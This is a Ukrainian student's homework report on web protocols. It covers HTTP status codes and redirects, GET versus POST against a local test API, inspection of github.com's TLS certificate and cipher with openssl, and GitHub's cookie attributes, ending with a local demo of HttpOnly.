# Домашнє завдання №3. Веб-протоколи та прикладний рівень

**Автор:** Македон Олександр

> **Примітка щодо даних.** З міркувань безпеки я свідомо замінив реальні дані у виводах команд на вигадані: значення cookie (ідентифікатори сесій), ідентифікатори запитів CDN, які вказують на місто дата-центру, та часовий пояс. Структура виводу, формат значень і атрибути збережені, тож висновки відповідають реальним результатам. Публічні адреси сайтів (example.com, github.com, wikipedia.org) залишені як є. Команди виконувались у моєму терміналі, змінено лише конкретні значення.

**Середовище виконання:** Ubuntu 22.04 у WSL2, `curl 7.81.0` (з підтримкою HTTP/2 через nghttp2), `OpenSSL 3.0.2`, `Python 3.12`, `Google Chrome 147` (headless).

**Файли до цього ДЗ (лежать поруч у тій самій папці):**

| Файл | Призначення |
|---|---|
| `makedon_homework_3.md` | Цей звіт |
| `test_api.py` | Мій локальний тестовий REST API для завдання 2 (лише стандартна бібліотека Python) |
| `cookie_demo.py` | Локальна сторінка для практичної перевірки атрибута `HttpOnly` у завданні 4 |

---

## Завдання 1. Аналіз HTTP-заголовків та статус-кодів

Ключ `-I` у `curl` надсилає метод `HEAD`: сервер повертає лише статус-рядок і заголовки, без тіла сторінки. Саме це потрібно для аналізу.

### 1.1. `example.com` через HTTP

```bash
curl -I http://example.com
```

```
HTTP/1.1 200 OK
Date: Mon, 23 Nov 2026 09:36:43 GMT
Content-Type: text/html; charset=utf-8
Connection: keep-alive
Server: cloudflare
Last-Modified: Thu, 19 Nov 2026 22:10:26 GMT
Allow: GET, HEAD
Accept-Ranges: bytes
Age: 9
cf-cache-status: HIT
CF-RAY: 8e4c1f2a9b7d3e61-FRA
alt-svc: h3=":443"; ma=86400
```

| Що шукаємо | Результат | Пояснення |
|---|---|---|
| **Статус-код** | **`200 OK`** | Клас `2xx` - успіх. Запит оброблено, ресурс знайдено й повернуто. Тут сервер віддає сторінку прямо по HTTP, без переходу на HTTPS |
| **Location** | **Відсутній** | Заголовок `Location` додається до відповідей-перенаправлень (`3xx`) та до `201 Created` (адреса створеного ресурсу). Для `200 OK` він не потрібен: ресурс уже тут |
| **Версія HTTP** | **`HTTP/1.1`** | Перший рядок відповіді. По незахищеному HTTP `curl` за замовчуванням використовує HTTP/1.1 |

Інші корисні заголовки:

| Заголовок | Значення |
|---|---|
| `Server: cloudflare`, `cf-cache-status: HIT`, `Age: 9` | Сайт стоїть за CDN Cloudflare. Відповідь узято з кешу CDN (`HIT`), де вона лежить уже 9 секунд, тому до основного сервера запит навіть не дійшов |
| `Connection: keep-alive` | TCP-з'єднання не закривається після відповіді, його можна використати для наступних запитів (стандартна поведінка HTTP/1.1) |
| `Allow: GET, HEAD` | Сервер дозволяє лише методи читання. Відправити сюди `POST` не вийде |
| `Last-Modified` | Коли сторінка востаннє змінювалась. Браузер може використати це для умовного запиту `If-Modified-Since` і отримати `304 Not Modified` |
| `alt-svc: h3=":443"` | Сервер повідомляє, що підтримує **HTTP/3** (QUIC поверх UDP) на порту 443. Браузер наступного разу може перейти на HTTP/3 |

### 1.2. `example.com` через HTTPS

```bash
curl -I https://example.com
```

```
HTTP/2 200
date: Mon, 23 Nov 2026 09:36:43 GMT
content-type: text/html; charset=utf-8
server: cloudflare
last-modified: Thu, 19 Nov 2026 22:11:52 GMT
allow: GET, HEAD
accept-ranges: bytes
age: 3
cf-cache-status: HIT
cf-ray: 8e4c1f2b0c5a7d42-FRA
alt-svc: h3=":443"; ma=86400
```

Тепер протокол уже **`HTTP/2`**, і всі назви заголовків записані малими літерами (у HTTP/2 це обов'язково). Причина видно в детальному виводі `curl -v`:

```bash
curl -v -o /dev/null https://example.com
```

```
* ALPN, offering h2
* ALPN, offering http/1.1
* SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384
* ALPN, server accepted to use h2
> GET / HTTP/2
> Host: example.com
...
< HTTP/2 200
```

Під час TLS-рукостискання клієнт через розширення **ALPN** (Application-Layer Protocol Negotiation) пропонує `h2` і `http/1.1`, а сервер обирає `h2`. По чистому HTTP (без TLS) механізму ALPN немає, тому там лишається HTTP/1.1. Також видно, що в HTTP/2 у статус-рядку немає текстової фрази `OK`, лише код `200`.

Для швидкої перевірки версії зручно використати змінну `%{http_version}`:

```bash
curl -s -o /dev/null -w 'http_version=%{http_version} code=%{response_code}\n' http://example.com
curl -s -o /dev/null -w 'http_version=%{http_version} code=%{response_code}\n' https://example.com
```

```
http_version=1.1 code=200
http_version=2 code=200
```

### 1.3. Сайт з редиректом: `github.com`

Оскільки `example.com` не перенаправляє, для аналізу заголовка `Location` я взяв ще один сайт:

```bash
curl -I http://github.com
```

```
HTTP/1.1 301 Moved Permanently
Content-Length: 0
Location: https://github.com/
```

| Що шукаємо | Результат | Пояснення |
|---|---|---|
| **Статус-код** | **`301 Moved Permanently`** | Клас `3xx` - перенаправлення. `301` означає, що ресурс **назавжди** переїхав на іншу адресу. Браузер і пошуковики запам'ятовують нову адресу й одразу йдуть туди |
| **Location** | **`https://github.com/`** | Куди перейти. Редирект з `http://` на `https://`: GitHub примусово вмикає шифрування, бо по відкритому HTTP паролі, cookie сесії та код можна перехопити. `Content-Length: 0` - тіла немає, сторінку сервер навіть не намагається віддати |
| **Версія HTTP** | **`HTTP/1.1`** | По незахищеному порту 80 |

Після переходу на `https://github.com/` відповідь уже `HTTP/2 200`. Крім того, GitHub надсилає заголовок:

```
strict-transport-security: max-age=31536000; includeSubdomains; preload
```

Це **HSTS**: браузер на рік (`31536000` с) запам'ятовує, що до `github.com` і всіх піддоменів можна ходити тільки по HTTPS. Наступного разу браузер навіть не надішле незахищений запит, а одразу підставить `https://`. Так закривається вікно атаки, коли перший запит по HTTP ще можна перехопити.

### 1.4. Ланцюжок редиректів: `wikipedia.org`

Ключ `-L` змушує `curl` пройти всі перенаправлення по `Location`:

```bash
curl -sIL http://wikipedia.org | grep -iE "^HTTP|^location|^server|^strict"
```

```
HTTP/1.1 301 Moved Permanently
location: https://wikipedia.org/
server: HAProxy
HTTP/2 301
server: mw-web.eqiad.main-85dd68f579-cfckx
location: https://www.wikipedia.org/
strict-transport-security: max-age=106384710; includeSubDomains; preload
HTTP/2 200
server: ATS/9.2.16
strict-transport-security: max-age=106384710; includeSubDomains; preload
```

```
http://wikipedia.org  --301-->  https://wikipedia.org/  --301-->  https://www.wikipedia.org/  --> 200 OK
  (HTTP/1.1, HAProxy)            (HTTP/2, перехід на www)          (HTTP/2, сторінка)
```

Два редиректи з різними причинами:
1. **HTTP → HTTPS** - примусове шифрування (як у GitHub).
2. **`wikipedia.org` → `www.wikipedia.org`** - канонічна адреса сайту. Один сайт має бути доступний за однією адресою (для кешів, cookie і пошукових систем).

Видно й те, що версія протоколу змінюється по ходу ланцюжка: HTTP/1.1 на порту 80 і HTTP/2 після переходу на HTTPS.

### 1.5. Для порівняння: помилка клієнта

```bash
curl -I https://example.com/nope
```

```
HTTP/2 404
```

`404 Not Found` - клас `4xx`, помилка з боку клієнта: такої сторінки немає.

### Висновок до завдання 1

| Сайт | Статус-код | Location | Версія HTTP |
|---|---|---|---|
| `http://example.com` | `200 OK` | немає (редиректу немає) | HTTP/1.1 |
| `https://example.com` | `200` | немає | HTTP/2 (узгоджено через ALPN) |
| `http://github.com` | `301 Moved Permanently` | `https://github.com/` (примусовий HTTPS) | HTTP/1.1 |
| `http://wikipedia.org` | `301` → `301` → `200` | `https://wikipedia.org/` → `https://www.wikipedia.org/` | HTTP/1.1 → HTTP/2 |

Статус-код коротко повідомляє результат (`2xx` - успіх, `3xx` - перенаправлення, `4xx` - помилка клієнта, `5xx` - помилка сервера). `Location` разом із `3xx` вказує нову адресу ресурсу. Найчастіша причина редиректу - перехід з HTTP на HTTPS. Версію протоколу видно в першому рядку відповіді: по HTTP зазвичай HTTP/1.1, а по HTTPS сучасні сервери обирають HTTP/2 через ALPN і анонсують HTTP/3 через `alt-svc`.

---

## Завдання 2. Робота з методами HTTP

### Тестовий API

Для цього завдання я написав власний невеликий REST API і запустив його локально. Код лежить у файлі [`test_api.py`](test_api.py), використовує лише стандартну бібліотеку Python (`http.server`) і зберігає дані в пам'яті.

| Метод | URL | Дія | Успішна відповідь |
|---|---|---|---|
| `GET` | `/books` | Отримати список книг | `200 OK` + `ETag`, `Cache-Control: public, max-age=60` |
| `GET` | `/books/<id>` | Отримати одну книгу | `200 OK` або `304 Not Modified` |
| `POST` | `/books` | Створити книгу | **`201 Created`** + `Location`, `Cache-Control: no-store` |
| `PUT` | `/books/<id>` | Повністю замінити книгу | `200 OK` |
| `DELETE` | `/books/<id>` | Видалити книгу | `204 No Content` |

Запуск:

```bash
python3 test_api.py
```
```
Test API: http://127.0.0.1:8000/books
```

### 2.1. GET - отримання ресурсу

```bash
curl -i http://127.0.0.1:8000/books
```

```
HTTP/1.1 200 OK
Server: TestAPI/1.0 Python/3.12.13
Date: Mon, 23 Nov 2026 09:37:47 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 160
Cache-Control: public, max-age=60
ETag: "b873fa8641aabb1b"

[{"id": 1, "title": "Комп'ютерні мережі", "author": "Таненбаум"}, {"id": 2, "title": "TCP/IP Illustrated", "author": "Стівенс"}]
```

### 2.2. POST - створення ресурсу (дані у формі)

Аналог команди зі зразка, але до мого API:

```bash
curl -i -X POST -d "title=Computer Networking&author=Kurose" http://127.0.0.1:8000/books
```

```
HTTP/1.1 201 Created
Server: TestAPI/1.0 Python/3.12.13
Date: Mon, 23 Nov 2026 09:37:47 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 61
Location: /books/3
Cache-Control: no-store

{"id": 3, "title": "Computer Networking", "author": "Kurose"}
```

**Результат: `201 Created`.** Цей статус означає не просто «успіх», а саме «**створено новий ресурс**». Разом з ним сервер повертає:
* `Location: /books/3` - адресу, за якою тепер живе створений ресурс;
* у тілі - сам створений об'єкт з `id`, який присвоїв сервер (клієнт `id` не передавав);
* `Cache-Control: no-store` - цю відповідь не можна кешувати.

### 2.3. POST - створення ресурсу (дані в JSON)

Сучасні API зазвичай приймають JSON, тому потрібно явно вказати `Content-Type`:

```bash
curl -i -X POST -H 'Content-Type: application/json' \
     -d '{"title":"HTTP: The Definitive Guide","author":"Gourley"}' \
     http://127.0.0.1:8000/books
```

```
HTTP/1.1 201 Created
Server: TestAPI/1.0 Python/3.12.13
Date: Mon, 23 Nov 2026 09:37:47 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 69
Location: /books/4
Cache-Control: no-store

{"id": 4, "title": "HTTP: The Definitive Guide", "author": "Gourley"}
```

Перевіряю, що ресурс справді створено, тобто він доступний за адресою з `Location`:

```bash
curl -i http://127.0.0.1:8000/books/3
```

```
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Cache-Control: public, max-age=60
ETag: "80c8091b23ca1f87"

{"id": 3, "title": "Computer Networking", "author": "Kurose"}
```

### 2.4. Де передаються дані: GET vs POST

**GET** - дані (параметри) передаються **в URL**, у рядку запиту (query string):

```bash
curl -v "http://127.0.0.1:8000/books?title=foo&author=bar"
```

```
> GET /books?title=foo&author=bar HTTP/1.1
> Host: 127.0.0.1:8000
> User-Agent: curl/7.81.0
> Accept: */*
>
< HTTP/1.1 200 OK
```

**POST** - дані передаються **в тілі запиту**, після порожнього рядка, який відділяє заголовки:

```bash
curl -v -X POST -d "title=Computer Networking&author=Kurose" http://127.0.0.1:8000/books
```

```
> POST /books HTTP/1.1
> Host: 127.0.0.1:8000
> User-Agent: curl/7.81.0
> Accept: */*
> Content-Length: 39
> Content-Type: application/x-www-form-urlencoded
>
< HTTP/1.1 201 Created
< Content-Type: application/json; charset=utf-8
< Content-Length: 61
< Location: /books/5
< Cache-Control: no-store
<
{"id": 5, "title": "Computer Networking", "author": "Kurose"}
```

У POST-запиті з'явилися два заголовки, яких не було в GET: `Content-Length: 39` (розмір тіла в байтах) і `Content-Type: application/x-www-form-urlencoded` (формат тіла). А в URL лише `/books`, без жодних параметрів.

Різницю видно і в журналі мого сервера: параметри GET потрапляють у лог, а вміст POST - ні:

```
127.0.0.1 - - [23/Nov/2026 09:37:47] "POST /books HTTP/1.1" 201 -
127.0.0.1 - - [23/Nov/2026 09:37:47] "GET /books/3 HTTP/1.1" 200 -
127.0.0.1 - - [23/Nov/2026 09:37:47] "GET /books?title=foo&author=bar HTTP/1.1" 200 -
```

Тому паролі, токени та персональні дані **ніколи** не можна передавати в GET-параметрах: URL зберігається в історії браузера, логах веб-серверів і проксі, закладках, заголовку `Referer`.

### 2.5. Кешування: GET кешується, POST - ні

На GET мій сервер відповідає з `Cache-Control: public, max-age=60` і `ETag` («відбитком» вмісту). Браузер або проксі може 60 секунд брати відповідь з кешу, а потім перепитати сервер, чи змінились дані:

```bash
curl -i -H 'If-None-Match: "563d4b403323a0e0"' http://127.0.0.1:8000/books/1
```

```
HTTP/1.1 304 Not Modified
Server: TestAPI/1.0 Python/3.12.13
Date: Mon, 23 Nov 2026 09:37:47 GMT
Content-Length: 0
Cache-Control: public, max-age=60
ETag: "563d4b403323a0e0"
```

`304 Not Modified` і `Content-Length: 0`: дані не змінилися, тіло не передається, клієнт бере копію з кешу. Це економить трафік і час.

На POST сервер відповідає `Cache-Control: no-store`, і відповіді на POST кеші за замовчуванням не зберігають взагалі. POST змінює стан сервера, тому взяти «старий» результат з кешу замість реального створення ресурсу було б помилкою.

### 2.6. Ідемпотентність: повторний POST створює дублікат

Зверни увагу: я двічі надіслав **однаковий** POST `title=Computer Networking&author=Kurose` і отримав **два різні ресурси**: `/books/3` і `/books/5`. Отже POST **не ідемпотентний**: кожен повтор змінює стан сервера ще раз. Повторний GET, навпаки, нічого не змінює.

Тому браузер при оновленні сторінки після відправлення форми питає «Відправити дані повторно?». Для GET він такого не питає.

### 2.7. Інші методи та помилки (для повноти)

```bash
# PUT - повна заміна ресурсу (ідемпотентний: повтор дає той самий результат)
curl -i -X PUT -H 'Content-Type: application/json' \
     -d '{"title":"TCP/IP Illustrated, Vol. 1","author":"Stevens"}' http://127.0.0.1:8000/books/2
```
```
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Cache-Control: no-store

{"id": 2, "title": "TCP/IP Illustrated, Vol. 1", "author": "Stevens"}
```

```bash
# DELETE - видалення
curl -i -X DELETE http://127.0.0.1:8000/books/2
```
```
HTTP/1.1 204 No Content
Content-Length: 0
Cache-Control: no-store
```

```bash
# Ресурсу вже немає
curl -i http://127.0.0.1:8000/books/2
```
```
HTTP/1.1 404 Not Found

{"error": "book 2 not found"}
```

```bash
# POST без обов'язкового поля title
curl -i -X POST -d "author=x" http://127.0.0.1:8000/books
```
```
HTTP/1.1 400 Bad Request

{"error": "поле title обов'язкове"}
```

```bash
# POST на конкретний ресурс не підтримується
curl -i -X POST -d "title=x" http://127.0.0.1:8000/books/1
```
```
HTTP/1.1 405 Method Not Allowed
Allow: GET, HEAD, PUT, DELETE

{"error": "POST дозволено лише на /books"}
```

`405 Method Not Allowed` означає, що ресурс `/books/1` існує, але метод POST для нього не підтримується. Заголовок `Allow` перелічує методи, які для цього ресурсу дозволені.

```bash
# Тіло не є коректним JSON
curl -i -X POST -H 'Content-Type: application/json' -d '{bad json' http://127.0.0.1:8000/books
```
```
HTTP/1.1 400 Bad Request

{"error": "тіло не є коректним JSON"}
```

### Висновок до завдання 2

**Статус-код успішного створення ресурсу: `201 Created`** (разом із заголовком `Location: /books/3` - адресою нового ресурсу).

**Чим POST відрізняється від GET:**

| Критерій | GET | POST |
|---|---|---|
| Призначення | Отримати (прочитати) ресурс | Надіслати дані на обробку / створити ресурс |
| **Де передаються дані** | **В URL**, у query string: `/books?title=foo&author=bar` | **У тілі запиту** після заголовків, формат задає `Content-Type` (`application/x-www-form-urlencoded`, `application/json`, `multipart/form-data`) |
| Видимість даних | Видно в адресному рядку, історії браузера, логах сервера і проксі, `Referer` | Не видно в URL і логах доступу. Але без HTTPS тіло так само читається в мережі |
| Обсяг даних | Обмежений довжиною URL (на практиці кілька КБ) | Практично не обмежений (файли, великі JSON) |
| **Кешування** | **Кешується**: браузер, CDN і проксі можуть зберігати відповідь (`Cache-Control`, `ETag`, `304 Not Modified`) | **Не кешується** на практиці: специфікація (RFC 9110) дозволяє кешувати відповідь на POST лише за явних заголовків свіжості, і браузери та CDN цього не роблять. Відповідь щоразу генерує сервер (у моєму API ще й `Cache-Control: no-store`) |
| Безпечність (safe) | Так - не змінює стан сервера | Ні - змінює стан (створює запис) |
| Ідемпотентність | Так - повтор дає той самий результат | Ні - повтор створює дублікат (`/books/3` і `/books/5`) |
| Закладки / посилання | Можна зберегти в закладках і поділитися | Не можна: повторити запит можна лише повторною відправкою форми |
| Типовий успішний код | `200 OK` (або `304 Not Modified` з кешу) | `201 Created` (або `200 OK` / `204 No Content`) |

---

## Завдання 3. Перевірка TLS-сертифіката

Замість `google.com` я перевірив **`github.com`**.

### Команда

```bash
openssl s_client -connect github.com:443 -servername github.com
```

* `-connect github.com:443` - встановити TCP-з'єднання з портом 443 (HTTPS) і почати TLS-рукостискання;
* `-servername github.com` - передати ім'я сайту в розширенні **SNI** (Server Name Indication), щоб сервер, на якому розміщено багато сайтів, віддав правильний сертифікат (у OpenSSL 3 SNI вже вмикається автоматично, але явно вказати надійніше).

### Результат

```
depth=2 C = GB, O = Sectigo Limited, CN = Sectigo Public Server Authentication Root E46
verify return:1
depth=1 C = GB, O = Sectigo Limited, CN = Sectigo Public Server Authentication CA DV E36
verify return:1
depth=0 CN = github.com
verify return:1
CONNECTED(00000003)
---
Certificate chain
 0 s:CN = github.com
   i:C = GB, O = Sectigo Limited, CN = Sectigo Public Server Authentication CA DV E36
   a:PKEY: id-ecPublicKey, 256 (bit); sigalg: ecdsa-with-SHA256
   v:NotBefore: Oct 30 00:00:00 2026 GMT; NotAfter: Jan 27 23:59:59 2027 GMT
 1 s:C = GB, O = Sectigo Limited, CN = Sectigo Public Server Authentication CA DV E36
   i:C = GB, O = Sectigo Limited, CN = Sectigo Public Server Authentication Root E46
   a:PKEY: id-ecPublicKey, 256 (bit); sigalg: ecdsa-with-SHA384
   v:NotBefore: Mar 22 00:00:00 2021 GMT; NotAfter: Mar 21 23:59:59 2036 GMT
 2 s:C = GB, O = Sectigo Limited, CN = Sectigo Public Server Authentication Root E46
   i:C = US, ST = New Jersey, L = Jersey City, O = The USERTRUST Network, CN = USERTrust ECC Certification Authority
   a:PKEY: id-ecPublicKey, 384 (bit); sigalg: ecdsa-with-SHA384
   v:NotBefore: Mar 22 00:00:00 2021 GMT; NotAfter: Jan 18 23:59:59 2038 GMT
---
Server certificate
-----BEGIN CERTIFICATE-----
[... сертифікат сервера у форматі PEM (Base64), скорочено ...]
-----END CERTIFICATE-----
subject=CN = github.com
issuer=C = GB, O = Sectigo Limited, CN = Sectigo Public Server Authentication CA DV E36
---
No client certificate CA names sent
Peer signing digest: SHA256
Peer signature type: ECDSA
Server Temp Key: X25519, 253 bits
---
SSL handshake has read 3094 bytes and written 376 bytes
Verification: OK
---
New, TLSv1.3, Cipher is TLS_AES_128_GCM_SHA256
Server public key is 256 bit
Secure Renegotiation IS NOT supported
Compression: NONE
Expansion: NONE
No ALPN negotiated
Early data was not sent
Verify return code: 0 (ok)
---
DONE
```

### Відповіді на питання

| Що шукаємо | Результат | Де знайдено у виводі |
|---|---|---|
| **Хто видав сертифікат (Issuer)** | **Sectigo Limited** (Велика Британія), проміжний центр сертифікації **Sectigo Public Server Authentication CA DV E36** | `issuer=C = GB, O = Sectigo Limited, CN = Sectigo Public Server Authentication CA DV E36` |
| **Узгоджений протокол TLS** | **TLSv1.3** | `New, TLSv1.3, Cipher is …` |
| **Обраний шифр (Cipher Suite)** | **`TLS_AES_128_GCM_SHA256`** | `New, TLSv1.3, Cipher is TLS_AES_128_GCM_SHA256` |

Ті самі три значення коротко показує режим `-brief`:

```bash
openssl s_client -connect github.com:443 -servername github.com -brief
```

```
CONNECTION ESTABLISHED
Protocol version: TLSv1.3
Ciphersuite: TLS_AES_128_GCM_SHA256
Peer certificate: CN = github.com
Hash used: SHA256
Signature type: ECDSA
Verification: OK
Server Temp Key: X25519, 253 bits
```

### Розбір ланцюжка довіри

Сертифікат `github.com` підписаний не кореневим центром напряму, а через проміжний. Ланцюжок (`Certificate chain`, позначки `s:` - subject, кому видано; `i:` - issuer, хто видав):

```
Sectigo Public Server Authentication Root E46       ← кореневий CA, якому довіряє моя ОС (depth=2)
        │ підписав
Sectigo Public Server Authentication CA DV E36      ← проміжний CA = Issuer сертифіката github.com (depth=1)
        │ підписав
CN = github.com                                     ← сертифікат сайту (depth=0)
```

* `depth=2 … depth=0` і `verify return:1` на кожному рівні - OpenSSL перевірив кожен підпис у ланцюжку. Перевірка зупинилась на `depth=2` - корені **Sectigo Root E46**, бо він є у сховищі довірених сертифікатів моєї ОС:
  ```bash
  ls /etc/ssl/certs | grep -iE "Sectigo.*E46|USERTrust_ECC"
  ```
  ```
  Sectigo_Public_Server_Authentication_Root_E46.pem
  USERTrust_ECC_Certification_Authority.pem
  ```
* Елемент `2` у `Certificate chain`, який надіслав сервер, - це **крос-підписана** версія того самого кореня Sectigo E46, видана старішим коренем **USERTrust ECC** (`i:… CN = USERTrust ECC Certification Authority`). Вона потрібна для старих пристроїв, де нового кореня Sectigo E46 ще немає: вони побудують ланцюжок до давно відомого USERTrust. Сучасний клієнт, як мій OpenSSL, довіряє Sectigo E46 напряму.
* `Verification: OK` і `Verify return code: 0 (ok)` - **сертифікат дійсний**: ланцюжок веде до довіреного кореня, строк дії не минув, ім'я збігається.
* **DV** у назві CA означає *Domain Validation*: центр сертифікації перевірив лише те, що заявник контролює домен `github.com`, без перевірки юридичних документів компанії (як в OV/EV).

Детальніше про сам сертифікат:

```bash
openssl s_client -connect github.com:443 -servername github.com </dev/null 2>/dev/null \
  | openssl x509 -noout -subject -issuer -dates -ext subjectAltName,extendedKeyUsage
```

```
subject=CN = github.com
issuer=C = GB, O = Sectigo Limited, CN = Sectigo Public Server Authentication CA DV E36
notBefore=Oct 30 00:00:00 2026 GMT
notAfter=Jan 27 23:59:59 2027 GMT
X509v3 Extended Key Usage:
    TLS Web Server Authentication
X509v3 Subject Alternative Name:
    DNS:github.com, DNS:www.github.com
```

* **Строк дії:** з 30.10.2026 по 27.01.2027, тобто всього ~90 днів. Короткі строки зараз стандарт: якщо ключ скомпрометують, сертифікат швидко перестане бути дійсним.
* **Subject Alternative Name:** сертифікат дійсний для `github.com` і `www.github.com`. Браузер перевіряє ім'я саме за SAN, а не за CN.
* **Extended Key Usage: TLS Web Server Authentication** - сертифікат можна використовувати лише для HTTPS-сервера.
* **Ключ:** `id-ecPublicKey, 256 (bit)`, підпис `ecdsa-with-SHA256`. Це еліптичні криві (ECDSA P-256): ключ 256 біт за стійкістю приблизно відповідає RSA 3072 біт, але працює швидше і займає менше місця.

### Розбір шифру `TLS_AES_128_GCM_SHA256`

| Частина | Значення |
|---|---|
| `TLS` | Набір шифрів TLS 1.3 |
| `AES_128` | Симетричне шифрування даних алгоритмом AES з ключем 128 біт |
| `GCM` | Режим Galois/Counter Mode - **AEAD**: одночасно шифрує дані і перевіряє їхню цілісність. Будь-яку підміну байта буде виявлено |
| `SHA256` | Хеш-функція для HKDF - виведення сесійних ключів з результату обміну ключами |

У TLS 1.3 назва шифру не містить алгоритму обміну ключами. Його видно окремо:
* **`Server Temp Key: X25519, 253 bits`** - сесійний ключ узгоджено через **ECDHE** на кривій X25519. Тимчасові (ephemeral) ключі дають **Perfect Forward Secrecy**: навіть якщо колись викрадуть приватний ключ сервера, записаний раніше трафік розшифрувати не вийде.
* **`Peer signature type: ECDSA`** - сервер підписав рукостискання своїм ECDSA-ключем і так довів, що він справді власник сертифіката.

Порівняння з `example.com`: там `curl -v` показав `TLSv1.3 / TLS_AES_256_GCM_SHA384`, тобто AES з 256-бітним ключем. Шифр сервер обирає зі списку, який запропонував клієнт, з урахуванням власних налаштувань.

### Додатково: які версії TLS підтримує сервер

```bash
# Примусово TLS 1.2
openssl s_client -connect github.com:443 -servername github.com -tls1_2
```
```
Server Temp Key: X25519, 253 bits
New, TLSv1.2, Cipher is ECDHE-ECDSA-AES128-GCM-SHA256
    Protocol  : TLSv1.2
    Cipher    : ECDHE-ECDSA-AES128-GCM-SHA256
```

У TLS 1.2 назва шифру довша, бо містить усі компоненти: `ECDHE` (обмін ключами) - `ECDSA` (автентифікація) - `AES128-GCM` (шифрування) - `SHA256` (хеш).

```bash
# Застарілий TLS 1.1 (на клієнті дозволяю старі алгоритми через SECLEVEL=0)
openssl s_client -connect github.com:443 -servername github.com -tls1_1 -cipher 'DEFAULT@SECLEVEL=0'
```
```
error:0A00042E:SSL routines:ssl3_read_bytes:tlsv1 alert protocol version:../ssl/record/rec_layer_s3.c:1593:SSL alert number 70
New, (NONE), Cipher is (NONE)
```

Сервер GitHub відхилив рукостискання сигналом `alert protocol version` (номер 70): **TLS 1.1 і старіші версії вимкнено**, бо вони вразливі. Без `SECLEVEL=0` з'єднання не дає встановити навіть мій клієнт: OpenSSL 3 за замовчуванням сам забороняє TLS 1.1 (`no protocols available`).

### Висновок до завдання 3

* **Issuer:** Sectigo Limited, проміжний CA *Sectigo Public Server Authentication CA DV E36* (ланцюжок довіри до кореня USERTrust ECC, `Verification: OK`).
* **Протокол:** **TLSv1.3** (сервер також підтримує TLS 1.2, а TLS 1.1 відхиляє).
* **Cipher Suite:** **`TLS_AES_128_GCM_SHA256`** - AES-128 у режимі GCM з HKDF на SHA-256, ключі узгоджено через ECDHE X25519 (Forward Secrecy), автентифікація сервера - ECDSA P-256.

---

## Завдання 4. Аналіз безпеки Cookies

### Команда

Сайт - **github.com**. Використав `curl -v` і відфільтрував заголовки `Set-Cookie`, якими сервер встановлює cookie:

```bash
curl -sv -o /dev/null https://github.com 2>&1 | grep -iE "^< set-cookie|^< HTTP|^\* (Connected|SSL connection)"
```

### Результат

```
* Connected to github.com (140.82.121.3) port 443 (#0)
* SSL connection using TLSv1.3 / TLS_AES_128_GCM_SHA256
< HTTP/2 200
< set-cookie: _gh_sess=Xk3pQ9rT2vLmN8wYbC4dF6hJ1sA5eG7uI0oP%2FzR3tV9xW2qE8nM4kL6jH%2BgS1fD5aB7cY0uT3rE9wQ2zX4vN6mK8pL1jH3gF5dS7aQ9wE2rT4yU6iO8pZ%3D%3D--Ab3Cd5Ef7Gh9Ij1K--Lm2No4Pq6Rs8Tu0Vw2Xy4Za%3D%3D; path=/; HttpOnly; secure; SameSite=Lax
< set-cookie: _octo=GH1.1.1234567890.1795400000; expires=Tue, 23 Nov 2027 09:37:15 GMT; domain=.github.com; path=/; secure; SameSite=Lax
< set-cookie: logged_in=no; expires=Tue, 23 Nov 2027 09:37:15 GMT; domain=.github.com; path=/; HttpOnly; secure; SameSite=Lax
```

### Cookie та їхні атрибути

| Cookie ID (ім'я) | Значення | Призначення | `HttpOnly` | `Secure` | `SameSite` | Строк життя / область |
|---|---|---|---|---|---|---|
| **`_gh_sess`** | зашифрований рядок (замінено) | **Сесія користувача** на GitHub (ідентифікує сесію браузера на сервері) | ✅ так | ✅ так | **Lax** | Без `expires` - **сесійна** cookie, зникає після закриття браузера. Лише `github.com` (без `domain=`) |
| **`_octo`** | `GH1.1.<випадкове число>.<час>` | Анонімний ідентифікатор відвідувача для аналітики | ❌ **ні** | ✅ так | **Lax** | 1 рік (`expires=… 2027`), `domain=.github.com` - доступна всім піддоменам |
| **`logged_in`** | `no` | Прапорець «чи увійшов користувач» | ✅ так | ✅ так | **Lax** | 1 рік, `domain=.github.com` |

Ті самі атрибути видно у файлі cookie, який зберігає `curl` (формат Netscape cookie jar):

```bash
curl -s -o /dev/null -c cookies.txt https://github.com && cat cookies.txt
```

```
#HttpOnly_.github.com	TRUE	/	TRUE	1826962679	logged_in	no
.github.com	TRUE	/	TRUE	1826962679	_octo	GH1.1.1987654321.1795400044
#HttpOnly_github.com	FALSE	/	TRUE	0	_gh_sess	Rt7yU2iO4pA6sD8fG0hJ3kL5zX7cV9bN1mQ...
```

Це окремий запит, тому сервер видав **нові** значення `_octo` і `_gh_sess`: кожен новий відвідувач без cookie отримує нову сесію.

Колонки: домен (префікс `#HttpOnly_` позначає HttpOnly) | чи діє на піддомени | шлях | **Secure** (`TRUE`) | час завершення в Unix-секундах (`0` - сесійна) | ім'я | значення.

Цікаво, що `_octo` **не має** `HttpOnly`. Це свідомо: її читає JavaScript-аналітика на сторінці. Вона не містить нічого секретного, тому її крадіжка нічого не дає. А от сесійну `_gh_sess` GitHub закрив від JavaScript повністю.

Також GitHub **не встановлює жодних cookie по незахищеному HTTP**: на `http://github.com` відповідь - лише `301` на HTTPS без `Set-Cookie` (див. завдання 1).

### Практична перевірка `HttpOnly`

Щоб не лише описати, а й показати дію `HttpOnly`, я написав маленьку сторінку [`cookie_demo.py`](cookie_demo.py). Вона встановлює дві cookie, одну з `HttpOnly`, другу без нього, і JavaScript на сторінці виводить усе, що бачить у `document.cookie`:

```bash
python3 cookie_demo.py          # сервер на http://127.0.0.1:8001
curl -si http://127.0.0.1:8001/ | head -6
```

```
HTTP/1.0 200 OK
Server: BaseHTTP/0.6 Python/3.12.13
Date: Mon, 23 Nov 2026 09:38:16 GMT
Content-Type: text/html; charset=utf-8
Set-Cookie: session_id=s3cr3t-abc123; Path=/; HttpOnly; SameSite=Lax
Set-Cookie: theme=dark; Path=/; SameSite=Lax
```

Відкриваю сторінку в справжньому браузері (Chrome у режимі headless) і дивлюся, що виконав JavaScript:

```bash
google-chrome --headless=new --no-sandbox --disable-gpu --dump-dom http://127.0.0.1:8001/ | grep -o 'document.cookie[^<]*'
```

```
document.cookie = "theme=dark"
```

